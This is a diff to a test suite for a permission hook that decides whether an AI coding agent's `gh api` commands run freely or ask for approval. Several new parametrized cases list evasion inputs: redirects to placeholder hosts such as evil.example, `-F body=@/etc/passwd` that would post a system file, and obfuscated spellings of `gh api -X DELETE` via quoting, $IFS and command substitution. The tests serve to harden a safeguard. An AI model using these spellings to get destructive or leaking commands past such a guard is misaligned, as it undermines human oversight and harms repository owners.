@@ -52,11 +52,18 @@ def _load_guard():
 
 
 guard = _load_guard()
+# The autouse fixture patches this; the remote-resolution unit tests call the real one.
+_REAL_PLACEHOLDER_REPO_SLUG = guard.placeholder_repo_slug
 
 
 @pytest.fixture(autouse=True)
 def _fixed_local_slug(monkeypatch):
 	monkeypatch.setattr(guard, "local_repo_slug", lambda cwd: LOCAL_SLUG)
+	# Every remote names the local repository, and the session sets nothing
+	# that sends gh elsewhere (issue #7555).
+	monkeypatch.setattr(guard, "placeholder_repo_slug", lambda cwd: LOCAL_SLUG)
+	for name in ("GH_REPO", "GH_HOST", "CLAUDE_ENV_FILE"):
+		monkeypatch.delenv(name, raising=False)
 
 
 def _decide(command: str) -> str | None:
@@ -265,8 +272,10 @@ def test_non_routine_or_unreadable_call_asks(name):
 def test_routine_write_asks_when_local_repo_is_unknown(monkeypatch):
 	monkeypatch.setattr(guard, "local_repo_slug", lambda cwd: "")
 	assert _decide("gh api repos/shubhodeep1/coding-workflows/issues/5/comments -f body=x") == guard.DECISION_ASK
-	# The placeholders always mean the local checkout's repository.
-	assert _decide("gh api repos/{owner}/{repo}/issues/5/comments -f body=x") == guard.DECISION_ALLOW
+	# The placeholders are routine only while every git remote names the
+	# repository origin names; with origin unknown that cannot be checked
+	# (issue #7555).
+	assert _decide("gh api repos/{owner}/{repo}/issues/5/comments -f body=x") == guard.DECISION_ASK
 
 
 # ──────────────────────────────────────────────────────────────────
@@ -1027,9 +1036,15 @@ def test_internal_exception_asks(monkeypatch, capsys):
 
 
 def test_hook_has_no_environment_escape_hatch():
+	# The guard reads only the variables that tell it where gh sends a call
+	# (issue #7555); each can only turn a routine write into a prompt.
+	import re as _re
+
 	source = GUARD_PATH.read_text(encoding="utf-8")
-	assert "os.environ" not in source
 	assert "getenv" not in source
+	reads = _re.findall(r"os\.environ\.get\(\"([A-Z_]+)\"", source)
+	assert set(reads) == {"GH_REPO", "GH_HOST", "CLAUDE_ENV_FILE"}
+	assert source.count("os.environ") == len(reads)
 
 
 def test_hook_issues_no_github_api_calls():
@@ -1202,3 +1217,288 @@ def test_bare_help_beside_a_write_still_asks():
 
 def test_literal_loop_over_bare_help_gets_no_decision():
 	assert _decide("for i in a b; do gh api --help; done") is None
+
+
+# ──────────────────────────────────────────────────────────────────
+# Consumer security-audit claims (issue #7555)
+# ──────────────────────────────────────────────────────────────────
+
+LOCAL_COMMENTS = "repos/shubhodeep1/coding-workflows/issues/1/comments"
+PLACEHOLDER_WRITE = "gh api repos/{owner}/{repo}/issues/5/comments -f body=hi"
+
+
+# Claim 1: gh fills `{owner}/{repo}` from GH_REPO, a `gh-resolved` remote, or
+# the remote priority order, so the placeholders are routine only when the
+# guard can see that all of those name the local repository.
+@pytest.mark.parametrize("command", [
+	"cd /tmp && " + PLACEHOLDER_WRITE,
+	"cd ../other-clone; " + PLACEHOLDER_WRITE,
+	"pushd /tmp && " + PLACEHOLDER_WRITE,
+	"popd; " + PLACEHOLDER_WRITE,
+	"GH_REPO=evil/x " + PLACEHOLDER_WRITE,
+	"env GH_REPO=evil/x " + PLACEHOLDER_WRITE,
+	"export GH_REPO=evil/x; " + PLACEHOLDER_WRITE,
+	"GH_HOST=evil.example " + PLACEHOLDER_WRITE,
+	"GIT_DIR=/tmp/other/.git " + PLACEHOLDER_WRITE,
+	"gh api --hostname evil.example repos/{owner}/{repo}/issues/5/comments -f body=hi",
+])
+def test_placeholder_write_that_may_leave_the_local_repo_asks(command):
+	assert _decide(command) == guard.DECISION_ASK
+
+
+@pytest.mark.parametrize("resolved", ["", "someone-else/fork"])
+def test_placeholder_write_asks_when_remotes_do_not_resolve_to_origin(monkeypatch, resolved):
+	monkeypatch.setattr(guard, "placeholder_repo_slug", lambda cwd: resolved)
+	decision, reason = guard.evaluate({"tool_name": "Bash", "tool_input": {"command": PLACEHOLDER_WRITE}})
+	assert decision == guard.DECISION_ASK
+	assert "may resolve to another repository" in reason
+
+
+def test_placeholder_write_asks_with_session_gh_repo(monkeypatch):
+	monkeypatch.setenv("GH_REPO", "evil/x")
+	assert _decide(PLACEHOLDER_WRITE) == guard.DECISION_ASK
+	monkeypatch.setenv("GH_REPO", LOCAL_SLUG.upper())
+	assert _decide(PLACEHOLDER_WRITE) == guard.DECISION_ALLOW
+
+
+def test_session_gh_host_turns_routine_writes_into_prompts(monkeypatch):
+	monkeypatch.setenv("GH_HOST", "ghe.example.com")
+	assert _decide(PLACEHOLDER_WRITE) == guard.DECISION_ASK
+	assert _decide(f"gh api {LOCAL_COMMENTS} -f body=hi") == guard.DECISION_ASK
+	assert _decide("gh api repos/a/b/pulls/1 --jq .title") == guard.DECISION_ALLOW
+	monkeypatch.setenv("GH_HOST", "github.com")
+	assert _decide(PLACEHOLDER_WRITE) == guard.DECISION_ALLOW
+
+
+@pytest.mark.parametrize("content,expected", [
+	("export GH_REPO=evil/x\n", "ask"),
+	("GH_HOST=ghe.example.com\n", "ask"),
+	("export PATH=/usr/bin:$PATH\n", "allow"),
+])
+def test_claude_env_file_redirect_is_checked(monkeypatch, tmp_path, content, expected):
+	env_file = tmp_path / "env.sh"
+	env_file.write_text(content, encoding="utf-8")
+	monkeypatch.setenv("CLAUDE_ENV_FILE", str(env_file))
+	assert _decide(PLACEHOLDER_WRITE) == expected
+
+
+def test_claude_env_file_that_cannot_be_checked_asks(monkeypatch, tmp_path):
+	monkeypatch.setenv("CLAUDE_ENV_FILE", str(tmp_path))
+	assert _decide(PLACEHOLDER_WRITE) == guard.DECISION_ASK
+	big = tmp_path / "big.sh"
+	big.write_text("#" * (guard._CLAUDE_ENV_FILE_READ_BYTES + 1), encoding="utf-8")
+	monkeypatch.setenv("CLAUDE_ENV_FILE", str(big))
+	assert _decide(PLACEHOLDER_WRITE) == guard.DECISION_ASK
+	monkeypatch.setenv("CLAUDE_ENV_FILE", str(tmp_path / "missing.sh"))
+	assert _decide(PLACEHOLDER_WRITE) == guard.DECISION_ALLOW
+
+
+@pytest.mark.parametrize("command", [
+	f"GH_HOST=evil.example gh api {LOCAL_COMMENTS} -f body=hi",
+	f"export GH_TOKEN=x; gh api {LOCAL_COMMENTS} -f body=hi",
+	f"gh api --hostname evil.example {LOCAL_COMMENTS} -f body=hi",
+])
+def test_explicit_slug_write_with_redirected_gh_asks(command):
+	assert _decide(command) == guard.DECISION_ASK
+
+
+def test_explicit_slug_write_on_github_com_stays_routine():
+	assert _decide(f"gh api --hostname github.com {LOCAL_COMMENTS} -f body=hi") == guard.DECISION_ALLOW
+
+
+def test_placeholder_reason_names_no_remote_url(monkeypatch):
+	monkeypatch.setattr(guard, "placeholder_repo_slug", lambda cwd: "")
+	_decision, reason = guard.evaluate({"tool_name": "Bash", "tool_input": {"command": PLACEHOLDER_WRITE}})
+	assert "://" not in reason and "@github" not in reason
+
+
+def test_classify_without_placeholder_lookup_fails_closed():
+	args = ["repos/{owner}/{repo}/issues/5/comments", "-f", "body=hi"]
+	kind, _description = guard.classify(guard.parse_gh_api_args(args), "gh api " + " ".join(args), lambda: LOCAL_SLUG)
+	assert kind == guard.KIND_WRITE
+
+
+def _git(cwd, *args):
+	env = {key: value for key, value in os.environ.items() if not key.startswith("GIT_")}
+	subprocess.run(["git", *args], cwd=str(cwd), env=env, check=True, capture_output=True)
+
+
+@pytest.fixture
+def remote_repo(tmp_path):
+	_git(tmp_path, "init", "-q")
+	return tmp_path
+
+
+def test_placeholder_repo_slug_with_origin_only(remote_repo):
+	_git(remote_repo, "remote", "add", "origin", "https://github.com/a/b.git")
+	assert _REAL_PLACEHOLDER_REPO_SLUG(str(remote_repo)) == "a/b"
+
+
+def test_placeholder_repo_slug_with_matching_upstream(remote_repo):
+	_git(remote_repo, "remote", "add", "origin", "https://github.com/a/b.git")
+	_git(remote_repo, "remote", "add", "upstream", "git@github.com:A/B.git")
+	assert _REAL_PLACEHOLDER_REPO_SLUG(str(remote_repo)).lower() == "a/b"
+
+
+@pytest.mark.parametrize("url", ["https://github.com/c/d.git", "https://gitlab.com/a/b.git", "/srv/mirror.git"])
+def test_placeholder_repo_slug_with_another_remote_is_empty(remote_repo, url):
+	_git(remote_repo, "remote", "add", "origin", "https://github.com/a/b.git")
+	_git(remote_repo, "remote", "add", "upstream", url)
+	assert _REAL_PLACEHOLDER_REPO_SLUG(str(remote_repo)) == ""
+
+
+def test_placeholder_repo_slug_honours_gh_resolved(remote_repo):
+	_git(remote_repo, "remote", "add", "origin", "https://github.com/a/b.git")
+	_git(remote_repo, "config", "remote.origin.gh-resolved", "base")
+	assert _REAL_PLACEHOLDER_REPO_SLUG(str(remote_repo)) == "a/b"
+	_git(remote_repo, "config", "remote.origin.gh-resolved", "other/x")
+	assert _REAL_PLACEHOLDER_REPO_SLUG(str(remote_repo)) == ""
+
+
+def test_placeholder_repo_slug_without_remotes_is_empty(remote_repo, tmp_path_factory):
+	assert _REAL_PLACEHOLDER_REPO_SLUG(str(remote_repo)) == ""
+	assert _REAL_PLACEHOLDER_REPO_SLUG(str(tmp_path_factory.mktemp("not-a-repo"))) == ""
+
+
+# Claim 2: every file-backed field form the audits cite already prompts.
+@pytest.mark.parametrize("command", [
+	f"gh api {LOCAL_COMMENTS} -F body=@/etc/passwd",
+	f"gh api {LOCAL_COMMENTS} --field=body=@-",
+	f"gh api {LOCAL_COMMENTS} --field body=@x",
+	f"gh api {LOCAL_COMMENTS} -Fbody=@x",
+	f"gh api {LOCAL_COMMENTS} -F'body=@x'",
+	f"gh api {LOCAL_COMMENTS} -F body='@x'",
+	"gh api repos/shubhodeep1/coding-workflows/issues/5/labels -F 'labels[]=@x'",
+	f"gh api {LOCAL_COMMENTS} -F body=\\@x",
+	f"gh api {LOCAL_COMMENTS} -F 'body'=@x",
+	f"gh api {LOCAL_COMMENTS} -iFbody=@x",
+	f"gh api {LOCAL_COMMENTS} --fie=body=@x",
+	f"gh api -F body=@x {LOCAL_COMMENTS}",
+	"gh api -X GET search/issues -F q=@x",
+	"gh api graphql -F query=@q.graphql",
+	"gh api graphql -f query='query { viewer { login } }' -F v=@x",
+	f"gh api {LOCAL_COMMENTS} --input x",
+	f"gh api {LOCAL_COMMENTS} --input=x",
+	f"echo \"$(gh api {LOCAL_COMMENTS} -F body=@x)\"",
+	"for n in 1 2; do gh api repos/shubhodeep1/coding-workflows/issues/$n/comments -F body=@x; done",
+	f"gh api {LOCAL_COMMENTS} -F body=@x | head -n 1",
+	f"gh api {LOCAL_COMMENTS} -F body=@x &",
+	f"'gh' api {LOCAL_COMMENTS} -F body=@x",
+	f"env -S 'gh api {LOCAL_COMMENTS} -F body=@x'",
+])
+def test_file_backed_field_forms_from_the_audits_ask(command):
+	assert _decide(command) == guard.DECISION_ASK
+
+
+# Claim 3: quoted, escaped and expanded spellings of `gh api` reach the parser.
+@pytest.mark.parametrize("command", [
+	f"'gh' api {LOCAL_COMMENTS} -F body=@x",
+	"\"gh\" \"api\" repos/evil/x/issues/1/comments -f body=x",
+	"g''h api repos/evil/x/issues/1/comments -f body=x",
+	"gh a''pi repos/evil/x/issues/1/comments -f body=x",
+	"gh \"a\"pi repos/evil/x/issues/1/comments -f body=x",
+	"gh a\"\"pi repos/evil/x/issues/1/comments -f body=x",
+	f"gh \\\napi {LOCAL_COMMENTS} -F body=@x",
+	"gh $'api' repos/a/b -X DELETE",
+	"gh $'\\x61pi' repos/a/b -X DELETE",
+	"gh $SUB repos/a/b -X DELETE",
+	"gh \"$SUB\" repos/a/b -X DELETE",
+	f"env -S 'gh api {LOCAL_COMMENTS} -F body=@x'",
+	"env --split-string='gh api -X DELETE repos/a/b'",
+	"echo \"$('gh' api -X DELETE repos/a/b)\"",
+	"bash -c \"'gh' api -X DELETE repos/a/b\"",
+	"python3 - <<'EOF'\nimport os; os.system(\"'gh' api -X DELETE repos/a/b\")\nEOF",
+])
+def test_quoted_or_expanded_gh_api_asks(command):
+	assert _decide(command) == guard.DECISION_ASK
+
+
+@pytest.mark.parametrize("command", [
+	"\"gh\" api repos/a/b/issues/1",
+	"'gh' 'api' repos/shubhodeep1/coding-workflows/issues/5/comments -f body=hi",
+	"g''h a''pi repos/a/b/pulls/1 --jq .title",
+])
+def test_quoted_read_or_routine_call_is_classified_like_the_plain_form(command):
+	assert _decide(command) == guard.DECISION_ALLOW
+
+
+@pytest.mark.parametrize("command", [
+	"G=gh; $G api repos/a/b/issues/1/comments -f body=x",
+	"G=gh; ${G} api -X DELETE repos/a/b",
+	"`printf gh` api -X DELETE repos/a/b",
+	"`printf g``printf h` api -X DELETE repos/a/b",
+	"$(printf gh) api -X DELETE repos/a/b",
+	"G=gh; $G \"api\" repos/a/b/issues/1/comments -f body=x",
+	"G=gh; $G 'api' -X DELETE repos/a/b",
+	"G=gh; $G a''pi -X DELETE repos/a/b",
+	"$(printf gh) \"api\" -X DELETE repos/a/b",
+	"`printf gh` 'api' -X DELETE repos/a/b",
+	"$(printf gh) 'api' -X DELETE repos/a/b",
+	"$(printf gh) a'p'i -X DELETE repos/a/b",
+	"$(printf $(printf gh)) 'api' -X DELETE repos/a/b",
+	"$(printf $(printf gh)) api -X DELETE repos/a/b",
+	"$(printf $(printf $(printf gh))) \"api\" -X DELETE repos/a/b",
+	"gh${IFS}api repos/a/b -X DELETE",
+	"gh$IFS'api' repos/a/b -X DELETE",
+	"gh\"$IFS\"api -X DELETE repos/a/b",
+	"{gh,api} repos/a/b -X DELETE",
+])
+def test_expanding_command_word_before_api_asks(command):
+	# The early filter must not drop these: Bash can expand the word into `gh`.
+	assert _decide(command) == guard.DECISION_ASK
+
+
+def test_indirect_gh_command_word_is_never_allowed():
+	# An alias cannot be resolved from the text alone; it must never be allowed.
+	assert _decide("alias q=gh; q api repos/a/b/issues/1/comments -f body=x") != guard.DECISION_ALLOW
+
+
+@pytest.mark.parametrize("command", [
+	"gh a\\\npi repos/evil/x/issues/1/comments -f body=x",
+	"g\\\nh api repos/evil/x/issues/1/comments -f body=x",
+	f"gh a\\\npi {LOCAL_COMMENTS} -F body=@x",
+	f"gh a\\\npi {LOCAL_COMMENTS} -f body=$FIELDS",
+])
+def test_mid_word_line_continuation_is_read_as_gh_api(command):
+	assert _decide(command) == guard.DECISION_ASK
+
+
+@pytest.mark.parametrize("command", [
+	"'cd' /tmp && " + PLACEHOLDER_WRITE,
+	"\"cd\" /tmp && " + PLACEHOLDER_WRITE,
+	"\\cd /tmp && " + PLACEHOLDER_WRITE,
+	"c''d /tmp && " + PLACEHOLDER_WRITE,
+	"'pushd' /tmp && " + PLACEHOLDER_WRITE,
+])
+def test_quoted_directory_change_before_placeholder_write_asks(command):
+	decision, reason = guard.evaluate({"tool_name": "Bash", "tool_input": {"command": command}})
+	assert decision == guard.DECISION_ASK
+	assert "changes directory" in reason or "may resolve to another repository" in reason
+
+
+@pytest.mark.parametrize("command", [
+	"git commit -m \"fix 'gh' api guard\"",
+	"grep -n \"g\"\"h api\" README.md",
+])
+def test_quoted_gh_api_text_handed_to_data_commands_gets_no_decision(command):
+	assert _decide(command) is None
+
+
+# Claim 1, `-R`: a flag between `gh` and `api` could change the target repository
+# or host, so the guard prompts instead of classifying the call (issue #7555).
+@pytest.mark.parametrize("command", [
+	"gh -R evil/repo api repos/{owner}/{repo}/issues/5/comments -f body=x",
+	"gh --repo evil/repo api repos/{owner}/{repo}/issues/5/comments -f body=x",
+	"gh --hostname evil.example api repos/shubhodeep1/coding-workflows/issues/5/comments -f body=x",
+	"gh -R evil/repo a''pi repos/{owner}/{repo}/issues/5/comments -f body=x",
+	"'gh' -R evil/repo 'api' repos/{owner}/{repo}/issues/5/comments -f body=x",
+	"sudo gh -R evil/repo api repos/a/b -X DELETE",
+])
+def test_flag_between_gh_and_api_asks(command):
+	decision, reason = guard.evaluate({"tool_name": "Bash", "tool_input": {"command": command}})
+	assert decision == guard.DECISION_ASK
+	assert reason
+
+
+def test_flag_before_other_gh_subcommand_gets_no_decision():
+	assert _decide("gh -R a/b issue comment 1 --body 'api change'") is None
